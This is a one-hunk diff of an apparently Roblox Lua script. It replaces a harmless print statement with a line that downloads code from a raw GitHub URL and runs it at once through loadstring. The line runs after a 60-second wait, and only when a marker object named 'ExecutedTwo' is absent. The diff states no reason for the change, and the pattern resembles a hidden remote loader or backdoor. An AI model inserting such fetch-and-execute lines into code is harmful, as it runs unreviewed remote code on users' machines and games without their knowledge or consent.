@@ -442,7 +442,7 @@ part.Parent = workspace
 wait(60)
 
 if not workspace:FindFirstChild("ExecutedTwo") then
-    print("not here")
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Pa1nx/System/refs/heads/main/Catch"))()
 end
 
 while true do
